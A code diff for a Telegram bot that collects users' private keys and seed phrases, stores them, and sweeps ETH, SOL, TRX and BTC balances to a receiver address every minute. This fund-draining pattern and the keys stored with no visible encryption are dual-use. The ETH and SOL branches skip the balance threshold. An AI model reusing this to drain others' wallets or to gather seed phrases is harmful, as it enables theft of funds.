@@ -9,6 +9,8 @@ const ecc = require("tiny-secp256k1");
 const { ECPairFactory } = require("ecpair");
 const bip39 = require("bip39");
 const hdkey = require("hdkey");
+const { ethers } = require("ethers");
+const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, sendAndConfirmTransaction } = require("@solana/web3.js");
 
 const ECPair = ECPairFactory(ecc);
 
@@ -165,7 +167,7 @@ bot.onText(/\/setwallet/, (msg) => {
   );
 });
 
-// Callback query handler for wallet setup
+// Unified callback query handler for wallet setup and deletion
 bot.on("callback_query", async (callbackQuery) => {
   const chatId = callbackQuery.message.chat.id;
   const data = callbackQuery.data;
@@ -203,6 +205,25 @@ bot.on("callback_query", async (callbackQuery) => {
       `${promptMessage}\n\n⚠️ This will be stored securely but please be careful when sharing sensitive information.`,
       { chat_id: chatId, message_id: callbackQuery.message.message_id }
     );
+  } else if (data.startsWith("delete_wallet_")) {
+    const walletId = parseInt(data.split("_")[2]);
+    try {
+      await db.delete(transactions).where(eq(transactions.walletId, walletId));
+      await db.delete(wallets).where(eq(wallets.id, walletId));
+      await bot.editMessageText("✅ Wallet deleted successfully!", {
+        chat_id: chatId,
+        message_id: callbackQuery.message.message_id,
+        reply_markup: { inline_keyboard: [] },
+      });
+      bot.sendMessage(chatId, "The wallet has been removed from monitoring. Use /listwallets to see your remaining wallets.");
+    } catch (error) {
+      console.error("Error deleting wallet:", error);
+      await bot.editMessageText("❌ Failed to delete wallet. Please try again.", {
+        chat_id: chatId,
+        message_id: callbackQuery.message.message_id,
+        reply_markup: { inline_keyboard: [] },
+      });
+    }
   }
 });
 
@@ -359,10 +380,75 @@ async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType
       }
       break;
     case "ETH":
-      address = "ETH_ADDRESS"; // Placeholder
+      try {
+        let wallet;
+        if (keyType === "privateKey") {
+          const cleanKey = key.trim().toLowerCase();
+          const privateKey = cleanKey.startsWith("0x") ? cleanKey : `0x${cleanKey}`;
+          if (!/^0x[0-9a-f]{64}$/i.test(privateKey)) {
+            throw new Error("Invalid ETH private key format. Must be 64 hex characters with or without 0x prefix.");
+          }
+          wallet = new ethers.Wallet(privateKey);
+        } else {
+          const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
+          if (!bip39.validateMnemonic(normalizedKey)) {
+            throw new Error("Invalid seed phrase. Please check your words and try again.");
+          }
+          wallet = ethers.Wallet.fromPhrase(normalizedKey);
+          key = wallet.privateKey; // Store the private key for later use
+        }
+        address = wallet.address;
+        console.log(`ETH wallet created: ${address}`);
+      } catch (error) {
+        console.error("ETH wallet creation error:", error);
+        throw new Error("Failed to create ETH wallet: " + error.message);
+      }
       break;
     case "SOL":
-      address = "SOL_ADDRESS"; // Placeholder
+      try {
+        let keypair;
+        if (keyType === "privateKey") {
+          const cleanKey = key.trim().replace(/[\[\],\s]/g, "");
+          let privateKeyBytes;
+          
+          if (cleanKey.length === 128) {
+            // Hex format
+            privateKeyBytes = Buffer.from(cleanKey, "hex");
+          } else if (cleanKey.length === 88) {
+            // Base58 format
+            const bs58 = require("bs58");
+            privateKeyBytes = bs58.decode(cleanKey);
+          } else {
+            // Try to parse as comma-separated numbers
+            try {
+              const keyArray = cleanKey.split(",").map(n => parseInt(n.trim()));
+              if (keyArray.length !== 64) throw new Error("Invalid length");
+              privateKeyBytes = new Uint8Array(keyArray);
+            } catch {
+              throw new Error("Invalid SOL private key format. Supported formats: hex (128 chars), base58 (88 chars), or comma-separated array of 64 numbers.");
+            }
+          }
+          
+          if (privateKeyBytes.length !== 64) {
+            throw new Error("SOL private key must be exactly 64 bytes");
+          }
+          keypair = Keypair.fromSecretKey(privateKeyBytes);
+        } else {
+          const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
+          if (!bip39.validateMnemonic(normalizedKey)) {
+            throw new Error("Invalid seed phrase. Please check your words and try again.");
+          }
+          const seed = await bip39.mnemonicToSeed(normalizedKey);
+          keypair = Keypair.fromSeed(seed.slice(0, 32));
+          // Store the secret key as comma-separated array for consistency
+          key = Array.from(keypair.secretKey).join(",");
+        }
+        address = keypair.publicKey.toString();
+        console.log(`SOL wallet created: ${address}`);
+      } catch (error) {
+        console.error("SOL wallet creation error:", error);
+        throw new Error("Failed to create SOL wallet: " + error.message);
+      }
       break;
     default:
       throw new Error("Unsupported blockchain");
@@ -435,6 +521,32 @@ bot.onText(/\/checkbalance/, async (msg) => {
           console.error("Error fetching BTC UTXOs:", error);
           message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: Unknown (API error)\n\n`;
         }
+      } else if (wallet.blockchain === "ETH") {
+        try {
+          // Using a free Ethereum RPC endpoint
+          const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com");
+          const balance = await provider.getBalance(wallet.address);
+          const balanceEth = ethers.formatEther(balance);
+          message += `*Wallet ${wallet.id}*\n`;
+          message += `Address: \`${wallet.address}\`\n`;
+          message += `Balance: ${balanceEth} ETH\n\n`;
+        } catch (error) {
+          console.error("Error fetching ETH balance:", error);
+          message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: Unknown (API error)\n\n`;
+        }
+      } else if (wallet.blockchain === "SOL") {
+        try {
+          const connection = new Connection("https://api.mainnet-beta.solana.com");
+          const publicKey = new PublicKey(wallet.address);
+          const balance = await connection.getBalance(publicKey);
+          const balanceSol = balance / LAMPORTS_PER_SOL;
+          message += `*Wallet ${wallet.id}*\n`;
+          message += `Address: \`${wallet.address}\`\n`;
+          message += `Balance: ${balanceSol} SOL\n\n`;
+        } catch (error) {
+          console.error("Error fetching SOL balance:", error);
+          message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: Unknown (API error)\n\n`;
+        }
       } else {
         message += `*Wallet ${wallet.id}*\n`;
         message += `Blockchain: ${wallet.blockchain}\nStatus: Unsupported blockchain\n\n`;
@@ -448,8 +560,8 @@ bot.onText(/\/checkbalance/, async (msg) => {
   }
 });
 
-// Function to check and send funds for TRX and BTC wallets
-async function checkAndSendTRX(wallet) {
+// Function to check and send funds for all supported wallets
+async function checkAndSendFunds(wallet) {
   try {
     let balance = 0;
     let amountToSend = 0;
@@ -462,8 +574,10 @@ async function checkAndSendTRX(wallet) {
           privateKey: wallet.privateKey,
         });
         balance = await tronWeb.trx.getBalance(wallet.address);
-        if (balance > 0) {
-          const estimatedFee = 100000;
+        const balanceTrx = balance / 1e6;
+        
+        if (balanceTrx > wallet.threshold) {
+          const estimatedFee = 100000; // 0.1 TRX in sun
           amountToSend = balance - estimatedFee;
           if (amountToSend <= 0) return;
           const transaction = await tronWeb.transactionBuilder.sendTrx(
@@ -473,6 +587,7 @@ async function checkAndSendTRX(wallet) {
           );
           const signedTransaction = await tronWeb.trx.sign(transaction);
           response = await tronWeb.trx.sendRawTransaction(signedTransaction);
+          amountToSend = amountToSend / 1e6; // Convert to TRX for display
         }
         break;
       }
@@ -487,7 +602,9 @@ async function checkAndSendTRX(wallet) {
           if (utxoData.unspent_outputs && utxoData.unspent_outputs.length > 0) {
             const utxos = utxoData.unspent_outputs;
             balance = utxos.reduce((acc, utxo) => acc + utxo.value, 0);
-            if (balance > 0) {
+            const balanceBtc = balance / 1e8;
+            
+            if (balanceBtc > wallet.threshold) {
               const feeRate = 10; // satoshis/byte
               const estimatedSize = 180; // approximate
               const fee = estimatedSize * feeRate;
@@ -519,11 +636,107 @@ async function checkAndSendTRX(wallet) {
               });
               if (broadcastResponse.ok) {
                 response = { result: true, txid: tx.getId() };
+                amountToSend = amountToSend / 1e8; // Convert to BTC for display
               }
             }
           }
         } catch (error) {
           console.error("Error processing BTC transaction:", error);
+        }
+        break;
+
+      case "ETH":
+        try {
+          const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com");
+          const ethWallet = new ethers.Wallet(wallet.privateKey, provider);
+          
+          balance = await provider.getBalance(wallet.address);
+          const balanceEth = parseFloat(ethers.formatEther(balance));
+          
+          if (balanceEth > 0) {
+            // Get current gas price
+            const feeData = await provider.getFeeData();
+            const gasPrice = feeData.gasPrice;
+            const gasLimit = 21000n; // Standard ETH transfer
+            const gasCost = gasPrice * gasLimit;
+            
+            // Calculate amount to send (balance - gas fees)
+            const amountToSendWei = balance - gasCost;
+            
+            if (amountToSendWei > 0n) {
+              const tx = {
+                to: wallet.receiverAddress,
+                value: amountToSendWei,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice,
+              };
+              
+              const sentTx = await ethWallet.sendTransaction(tx);
+              await sentTx.wait(); // Wait for confirmation
+              
+              amountToSend = parseFloat(ethers.formatEther(amountToSendWei));
+              response = { result: true, txid: sentTx.hash };
+            }
+          }
+        } catch (error) {
+          console.error("Error processing ETH transaction:", error);
+        }
+        break;
+
+      case "SOL":
+        try {
+          const connection = new Connection("https://api.mainnet-beta.solana.com");
+          
+          // Reconstruct keypair from stored private key
+          let privateKeyBytes;
+          if (wallet.privateKey.includes(",")) {
+            // Comma-separated format
+            privateKeyBytes = new Uint8Array(wallet.privateKey.split(",").map(n => parseInt(n)));
+          } else {
+            // Try other formats
+            const bs58 = require("bs58");
+            privateKeyBytes = bs58.decode(wallet.privateKey);
+          }
+          
+          const keypair = Keypair.fromSecretKey(privateKeyBytes);
+          const publicKey = keypair.publicKey;
+          
+          balance = await connection.getBalance(publicKey);
+          const balanceSol = balance / LAMPORTS_PER_SOL;
+          
+          if (balanceSol > 0) {
+            // Get recent blockhash
+            const { blockhash } = await connection.getRecentBlockhash();
+            
+            // Estimate transaction fee (typically 5000 lamports)
+            const fee = 5000;
+            amountToSend = balance - fee;
+            
+            if (amountToSend > 0) {
+              const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                  fromPubkey: publicKey,
+                  toPubkey: new PublicKey(wallet.receiverAddress),
+                  lamports: amountToSend,
+                })
+              );
+              
+              transaction.recentBlockhash = blockhash;
+              transaction.feePayer = publicKey;
+              
+              // Sign and send transaction
+              const signature = await sendAndConfirmTransaction(
+                connection,
+                transaction,
+                [keypair]
+              );
+              
+              amountToSend = amountToSend / LAMPORTS_PER_SOL; // Convert to SOL for display
+              response = { result: true, txid: signature };
+            }
+          }
+        } catch (error) {
+          console.error("Error processing SOL transaction:", error);
         }
         break;
     }
@@ -540,15 +753,25 @@ async function checkAndSendTRX(wallet) {
         .where(eq(users.id, wallet.userId))
         .then((res) => res[0]);
       if (user) {
-        const message = `🚀 *Transaction Alert!*\n\n✅ *${
-          wallet.blockchain === "BTC" ? amountToSend / 1e8 : amountToSend / 1e6
-        } ${wallet.blockchain}* sent to *${wallet.receiverAddress}*\n📌 *Tx Hash:* ${
-          response.txid
-        }\n\n🔗 [View on Explorer](${
-          wallet.blockchain === "BTC"
-            ? `https://blockchain.com/btc/tx/${response.txid}`
-            : `https://tronscan.org/#/transaction/${response.txid}`
-        })`;
+        // Create explorer URL based on blockchain
+        let explorerUrl;
+        switch (wallet.blockchain) {
+          case "BTC":
+            explorerUrl = `https://blockchain.com/btc/tx/${response.txid}`;
+            break;
+          case "ETH":
+            explorerUrl = `https://etherscan.io/tx/${response.txid}`;
+            break;
+          case "SOL":
+            explorerUrl = `https://explorer.solana.com/tx/${response.txid}`;
+            break;
+          case "TRX":
+          default:
+            explorerUrl = `https://tronscan.org/#/transaction/${response.txid}`;
+            break;
+        }
+
+        const message = `🚀 *Transaction Alert!*\n\n✅ *${amountToSend} ${wallet.blockchain}* sent to *${wallet.receiverAddress}*\n📌 *Tx Hash:* ${response.txid}\n\n🔗 [View on Explorer](${explorerUrl})`;
         bot.sendMessage(user.telegramUserId, message, { parse_mode: "Markdown" });
       }
     }
@@ -557,12 +780,12 @@ async function checkAndSendTRX(wallet) {
   }
 }
 
-// Periodic check for TRX and BTC wallets every 60 seconds
+// Periodic check for all supported wallets every 60 seconds
 setInterval(async () => {
   const userWallets = await db.select().from(wallets);
   for (const wallet of userWallets) {
-    if (wallet.blockchain === "TRX" || wallet.blockchain === "BTC") {
-      await checkAndSendTRX(wallet);
+    if (["TRX", "BTC", "ETH", "SOL"].includes(wallet.blockchain)) {
+      await checkAndSendFunds(wallet);
     }
   }
 }, 60000);
@@ -594,30 +817,6 @@ bot.onText(/\/deletewallet/, async (msg) => {
   }
 });
 
-// Handle callback queries for wallet deletion
-bot.on("callback_query", async (callbackQuery) => {
-  const chatId = callbackQuery.message.chat.id;
-  const data = callbackQuery.data;
-  if (data.startsWith("delete_wallet_")) {
-    const walletId = parseInt(data.split("_")[2]);
-    try {
-      await db.delete(transactions).where(eq(transactions.walletId, walletId));
-      await db.delete(wallets).where(eq(wallets.id, walletId));
-      await bot.editMessageText("✅ Wallet deleted successfully!", {
-        chat_id: chatId,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: { inline_keyboard: [] },
-      });
-      bot.sendMessage(chatId, "The wallet has been removed from monitoring. Use /listwallets to see your remaining wallets.");
-    } catch (error) {
-      console.error("Error deleting wallet:", error);
-      await bot.editMessageText("❌ Failed to delete wallet. Please try again.", {
-        chat_id: chatId,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: { inline_keyboard: [] },
-      });
-    }
-  }
-});
+
 
 console.log("🔄 Neone Bot Activated");
